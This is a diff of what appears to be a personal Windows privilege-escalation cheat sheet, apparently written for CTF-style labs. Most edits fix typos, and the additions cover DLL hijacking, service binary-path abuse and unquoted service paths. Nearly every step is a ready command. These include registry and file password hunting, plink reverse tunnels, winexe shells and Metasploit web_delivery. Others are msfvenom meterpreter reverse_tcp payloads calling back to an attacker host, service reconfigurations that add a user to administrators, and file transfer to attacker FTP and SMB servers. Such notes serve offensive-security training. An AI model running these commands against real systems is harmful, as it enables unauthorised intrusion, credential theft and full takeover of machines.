@@ -249,7 +249,7 @@ Windows Enumeration:
 -     check all IPs that are connected to the machine --> arp -a
 -     check what other machines are communicating to the machine (Possible to Pivoting) --> route print
 -     check open ports on the machine (Possible to port forwarding) --> netstat -ano
-- password hunting (passwords are in files).make sure in which directory you are then run the command. you also can run the command in the root directory
+- password hunting (passwords are in files). make sure in which directory you are then run the command. you also can run the command in the root directory
 -     findstr /si password *.txt *.ini *.config
 - firewall & Antivirus
 -     find info about particular services like windefend --> sc query windefend
@@ -276,12 +276,12 @@ Windows Enumeration:
   4- Update the database --> ./windows-exploit-suggester.py --update
   5- ./windows-exploit-suggester.py --database <updatedDB.xls> --systeminfo <sysinfo.txt>
   
-- Stored Passwrods
+- Stored Passwords
 - check the registry. you may find a default password
 -     reg query HKLM /f password /t REG_SZ /s
 - if you find any default password run the following
 -     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-- if there is ssh running on the system use the found credentials to login
+- if SSH is running on the system use the found credentials to login
 
 **keep in mind to check the permissions in windows like icacls, icacls root.txt /grant <username>:F (this will grant full access to a file)**
 
@@ -301,10 +301,10 @@ here is all kernel exploitation from GitHub: https://github.com/SecWiki/windows-
 -     service ssh restart && service ssh enable
 - from the Windows machine
 -     plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
-- assume windows has a local smb service running on 445 and your kali machine is 10.10.16.9. if you have credentials you can use tool like psexec to login but if you don't have use the following tunneling
+- assume windows has a local SMB service running on 445 and your Kali machine is 10.10.16.9. if you have credentials you can use a tool like psexec to login but if you don't have, use the following tunneling
 -     plink.exe -l raman -pw to0or -R 445:127.0.0.1:445 10.10.16.9
 - keep on hitting enter and you will get a root shell (this is the windows machine not kali machine)
-- now you need to use winexe tool to execute a command in windows
+- now you need to use winexe tool to execute a command in Windows
 -     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
 - run the command multiple times if it doesn't work
 
@@ -320,7 +320,7 @@ here is all kernel exploitation from GitHub: https://github.com/SecWiki/windows-
 if you get a cmd shell and you can't upload any file on the system use msfconsole for the privilege escaliton
 use /exploit/multi/script/web_delivery
 set SRVHOST | PAYLOAD | LHOST | LPORT | TARGET then run
-copy any paste the payload into the cmd shell. you should have a new session
+copy and paste the payload into the cmd shell. you should have a new session
 after getting the meterpreter session run post/multi/recon/local_exploit_suggester
 use any of the suggested exploits and run it
 in the meterpreter shell type
@@ -334,16 +334,23 @@ Alternate Data Stream (hidden files)
 ls -la is equal to dir /R in windows
 -     more < raman.txt:hidden.txt
 
-Copy a file from windows to Linux by setting up smb server
-setup the smbserver
+Copy a file from Windows to Linux by setting up SMB server
+setup a smbserver
 -     impacket-smbserver raman `pwd`
 cd to the share
 -     cd \\10.10.16.13\raman
 -     cp c:\users\raman\raman.kdbx .
+setup an FTP server
+-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
+head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
+-     ftp 10.10.16.4
+-     username:anonymous
+-     put windows_service.c
 
 5- Get System
 
 6- RunAs
+run the following command to check next two lines information 
 -     cmdkey /list
 if you find Target: Domain:interactive=Access\Administrator Type: Domain Password User: Access\Administrator
 use RunAs command to get the flag
@@ -360,12 +367,12 @@ another option is to use meterpreter to elevate your session
 
 8- abusing service registry
 to check if you have access to the registry service 
--     powershell -ep bypass
+-     PowerShell -ep bypass
 -     Get-Acl -Path hkln:\System\CurrentControlSet\service\regsvc | fl
 if you have FullControl in the Access for your user (might be NT AUTHORITY\INTERACTIVE ALLOW). you can let the service run a reverse shell or add a user to the administrator group
-now you need to download a file from windows to kali. use ftp server to do that
+now you need to download a file from Windows to Kali. Use an FTP server to do that
 -     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
-head to C:\Tools\Source and connect to kali ftp server, anonymous login, then put the windows_service.c file
+head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
 -     ftp 10.10.16.4 | username:anonymous | put windows_service.c
 edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). DON'T FORGET TO COMPILE THE C FILE
 -     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
@@ -384,16 +391,46 @@ head to C:\Tools\Source and connect to kali ftp server, anonymous login, then pu
 -     ftp 10.10.16.4 | username:anonymous | put windows_service.c
 edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). DON'T FORGET TO COMPILE THE C FILE
 -     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
-move the compiled c file to windows (replace it with c:\ProgramFiles\FilePermissionsService) then run it using
+move the compiled c file to Windows (replace it with c:\ProgramFiles\FilePermissionsService) then run it using
 -     sc start FilePermService
 net localgroup administrator
 
 10- Startup Applications
-check if you have write access to the startup application. if yes use msfvenom to get a meterpreter session
+check if you have written access to the startup application. if yes use msfvenom to get a meterpreter session
 -     icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (BUILTIN\Users:(F)) //F means you have full access
 save the below payload in the c:\ProgramData\Microsoft\StartMenu\Programs\Startup and start-up multihandler
 -     msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe -o raman.exe
 then you need to wait for the administrator to login then you will get a shell
+
+11- DLL Hijacking
+look for a writeable path and the DLL doesn't exist (DLL name not found). cause when you run an executable program in Windows the program will look for a DLL. if the DLL doesn't exists you can get malicious
+you will use the following script https://github.com/sagishahar/scripts/blob/master/windows_dll.c
+-     system("cmd.exe /k net localgroup administrators user /add"); #replace the following with the system command to add a user
+compile the c file. transfer it to Windows. download the dll file. move to the writeable path and run the following command
+-     sc stop dllsvc && sc start dllsvc #stop dll service and restart it again
+
+12- Binary Path
+run PowerUp.ps1
+in the cmd type 
+-     accesschk64.exe -uwcv Everyone *
+the output shows 'RW daclsvc' this means you have read and write in the daclsvc service. look for SERVICE_CHANGE_CONFIG in the output 
+-     accesschk64.exe -uwcv daclsvc #get more information on the service
+if you find SERVICE_CHANGE_CONFIG in the daclsvc service means you can change the configuration 
+query the service
+-     sc qc daclsvc
+if you find BINARY_PATH_NAME in the output you can change the configuration 
+-     sc config daclsvc binpath* "net localgroup administrators user /add" #add the user in the administrators group
+-     sc start daclsvc #start the service again
+
+13- Unquoted Service Path
+this means the service path doesn't have quotes  so what will happen is the windows will run the following path as Program.exe -> Program Files.exe -> Unqouted.exe -> Unqouted Path.exe -> Unqouted Path Service.exe.
+run PowerUp.ps1 to check the unquoted path
+C:\Program Files\Unquoted Path Service\Common Files\...
+so what if you can make a malicious executable file named Common.exe? Windows will run it
+create a common.exe file using msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe -o common.exe
+move the file to the common path and upload the file then start the service again 
+-     sc start unquotedsvc
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
